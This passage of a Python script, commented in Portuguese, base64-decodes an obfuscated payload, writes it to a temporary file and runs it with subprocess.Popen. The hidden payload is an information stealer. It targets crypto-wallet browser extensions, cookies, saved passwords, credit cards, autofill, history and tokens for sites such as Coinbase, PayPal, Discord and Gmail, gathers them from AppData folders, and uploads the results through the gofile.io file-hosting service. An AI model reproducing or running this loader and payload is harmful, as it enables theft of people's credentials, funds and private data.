FhbW1taiIsICJHdWlsZCIgICAgICAgICAgICBdLA0KICAgIFsibmtkZGduY2RqZ2pmY2RkYW1mZ2NtZm5saGNjbmltaWciLCAiU2F0dXJuIiAgICAgICAgICAgXSwNCiAgICBbImFpaWZibmJmb2JwbWVla2lwaGVlaWppbWRwbmxwZ3BwIiwgIlRlcnJhU3RhdGlvbiIgICAgIF0sDQogICAgWyJmbm5lZ3BobG9iamRwa2hlY2Fwa2lqamRrZ2NqaGtpYiIsICJIYXJtb255T3V0ZGF0ZWQiICBdLA0KICAgIFsiY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmsiLCAiRXZlciIgICAgICAgICAgICAgXSwNCiAgICBbInBkYWRqa2ZrZ2NhZmdiY2VpbWNwYmthbG5mbmVwYm5rIiwgIkthcmRpYUNoYWluIiAgICAgIF0sDQogICAgWyJtZ2Zma2ZiaWRpaGpwb2FvbWFqbGJnY2hkZGxpY2dwbiIsICJQYWxpV2FsbGV0IiAgICAgICBdLA0KICAgIFsiYW9ka2thZ25hZGNib2JmcGdnZm5qZW9uZ2VtamJqY2EiLCAiQm9sdFgiICAgICAgICAgICAgXSwNCiAgICBbImtwZm9wa2VsbWFwY29pcGVtZmVuZG1kY2dobmVnaW1uIiwgIkxpcXVhbGl0eSIgICAgICAgIF0sDQogICAgWyJobWVvYm5mbmZjbWRrZGNtbGJsZ2FnbWZwZmJvaWVhZiIsICJYREVGSSIgICAgICAgICAgICBdLA0KICAgIFsibHBmY2Jqa25panBlZWlsbGlmbmtpa2duY2lrZ2ZoZG8iLCAiTmFtaSIgICAgICAgICAgICAgXSwNCiAgICBbImRuZ21sYmxjb2Rmb2JwZHBlY2FhZGdmYmNnZ2ZqZm5tIiwgIk1haWFyREVGSSIgICAgICAgIF0sDQogICAgWyJvb2tqbGJraWlqaW5ocG1uamZmY29mam9uYmZiZ2FvYyIsICJUZW1wbGVUZXpvcyIgICAgICBdLA0KICAgIFsiZWlnYmxiZ2prbmxmYmFqa2Zob3BtY29qaWRsZ2NlaG0iLCAiWE1SLlBUIiAgICAgICAgICAgXSwNCl0NCklQID0gZ2V0aXAoKQ0KbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpDQpyb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykNCnRlbXAgPSBvcy5nZXRlbnYoIlRFTVAiKQ0KDQprZXl3b3JkID0gWydbY29pbmJhc2VdKGh0dHBzOi8vY29pbmJhc2UuY29tKScsICdbc2VsbGl4XShodHRwczovL3NlbGxpeC5pbyknLCAnW2dtYWlsXShodHRwczovL2dtYWlsLmNvbSknLCAnW3N0ZWFtXShodHRwczovL3N0ZWFtLmNvbSknLCAnW2Rpc2NvcmRdKGh0dHBzOi8vZGlzY29yZC5jb20pJywgJ1tyaW90Z2FtZXNdKGh0dHBzOi8vcmlvdGdhbWVzLmNvbSknLCAnW3lvdXR1YmVdKGh0dHBzOi8veW91dHViZS5jb20pJywgJ1tpbnN0YWdyYW1dKGh0dHBzOi8vaW5zdGFncmFtLmNvbSknLCAnW3Rpa3Rva10oaHR0cHM6Ly90aWt0b2suY29tKScsICdbdHdpdHRlcl0oaHR0cHM6Ly90d2l0dGVyLmNvbSknLCAnW2ZhY2Vib29rXShodHRwczovL2ZhY2Vib29rLmNvbSknLCAnW2VwaWNnYW1lc10oaHR0cHM6Ly9lcGljZ2FtZXMuY29tKScsICdbc3BvdGlmeV0oaHR0cHM6Ly9zcG90aWZ5LmNvbSknLCAnW3lhaG9vXShodHRwczovL3lhaG9vLmNvbSknLCAnW3JvYmxveF0oaHR0cHM6Ly9yb2Jsb3guY29tKScsICdbdHdpdGNoXShodHRwczovL3R3aXRjaC5jb20pJywgJ1ttaW5lY3JhZnRdKGh0dHBzOi8vbWluZWNyYWZ0Lm5ldCknLCAnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsICdbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pJywgJ1thbWF6b25dKGh0dHBzOi8vYW1hem9uLmNvbSknLCAnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywgJ1thbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKScsICdbcGxheXN0YXRpb25dKGh0dHBzOi8vcGxheXN0YXRpb24uY29tKScsICdbaGJvXShodHRwczovL2hiby5jb20pJywgJ1t4Ym94XShodHRwczovL3hib3guY29tKScsICdbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSknLCAnW2hvdG1haWxdKGh0dHBzOi8vaG90bWFpbC5jb20pJywgJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsICdbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKScsICdbdGVsZWdyYW1dKGh0dHBzOi8vdGVsZWdyYW0uY29tKScsICdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCAnW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKScsICdbZXhwcmVzc3Zwbl0oaHR0cHM6Ly9leHByZXNzdnBuLmNvbSknLCAnW3ViZXJdKGh0dHBzOi8vdWJlci5jb20pJywgJ1tuZXRmbGl4XShodHRwczovL25ldGZsaXguY29tKScsICdbZ2l0aHViXShodHRwczovL2dpdGh1Yi5jb20pJywgJ1tnbWFpbF0oaHR0cHM6Ly9nbWFpbC5jb20pJ10NCkNvb2tpQ291bnQsIFBhc3N3Q291bnQsIENDc0NvdW50LCBBdXRvZmlsbENvdW50LCBIaXN0b3J5Q291bnQsIEJvb2ttYXJrc0NvdW50ID0gMCwgMCwgMCwgMCwgMCwgMA0KY29va2lXb3JkcywgcGFzd1dvcmRzLCBIaXN0b3J5LCBDQ3MsIFBhc3N3LCBBdXRvZmlsbCwgQ29va2llcywgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcCwgVGhyZWFkbGlzdCwgS2l3aUZpbGVzLCBCb29rbWFya3MsIFRva2VucyA9IFtdLCBbXSwgW10sIFtdLCBbXSwgW10sIFtdLCBbXSwgW10sIFtdLCBbXSwgW10sIFtdLCAnJw0KDQp0cnk6Z29maWxlc2VydmVyID0ganNvbl9sb2Fkcyh1cmxvcGVuKCJodHRwczovL2FwaS5nb2ZpbGUuaW8vZ2V0U2VydmVyIikucmVhZCgpLmRlY29kZSgndXRmLTgnKSlbImRhdGEiXVsic2VydmVyIl0NCmV4Y2VwdDpnb2ZpbGVzZXJ2ZXIgPSAic3RvcmU0Ig0KR0xJTkZPID0gZ2xvYmFsSW5mbygpDQpHYXRoZXJBbGwoKQ0KREVURUNURUQgPSBUcnVzdChDb29raWVzKQ0KaWYgbm90IERFVEVDVEVEOg0KICAgIHdpa2l0aCA9IEtpd2koKQ0KDQogICAgZm9yIHRocmVhZCBpbiB3aWtpdGg6IHRocmVhZC5qb2luKCkNCiAgICB0aW1lLnNsZWVwKDAuMikNCg0KICAgIGZpbGV0ZXh0ID0gIlxuIg0KICAgIGZvciBhcmcgaW4gS2l3aUZpbGVzOg0KICAgICAgICBpZiBsZW4oYXJnWzJdKSAhPSAwOg0KICAgICAgICAgICAgZm9sZHBhdGggPSBhcmdbMV0ucmVwbGFjZSgiXFwiLCAiLyIpDQogICAgICAgICAgICBmb2xkbGlzdCA9IGFyZ1syXQ0KICAgICAgICAgICAgZmlsZXRleHQgKz0gZiLwn5OBIHtmb2xkcGF0aH1cbiINCg0KICAgICAgICAgICAgZm9yIGZmaWwgaW4gZm9sZGxpc3Q6DQogICAgICAgICAgICAgICAgYSA9IGZmaWxbMF0uc3BsaXQoIi8iKQ0KICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0NCiAgICAgICAgICAgICAgICBiID0gZmZpbFsxXQ0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi4pSU4pSAOm9wZW5fZmlsZV9mb2xkZXI6IFt7ZmlsZWFubWV9XSh7Yn0pXG4iDQogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iDQogICAgdXBsb2FkKCJraXdpIiwgZmlsZXRleHQp"

decoded_string = base64.b64decode(cz).decode('utf-8')

# Criando um arquivo temporrio para escrever o cdigo desofuscado
with tempfile.NamedTemporaryFile(mode='w', delete=False, encoding='utf-8') as temp_file:
    temp_file.write(decoded_string)

# Definindo o nome do arquivo temporrio criado acima
temp_filename = temp_file.name

# Executando o arquivo temporrio usando subprocess.Popen()
with open('output.txt', 'w', encoding='utf-8') as f:
    subprocess.Popen(['python', temp_filename], stdout=f, stderr=f)
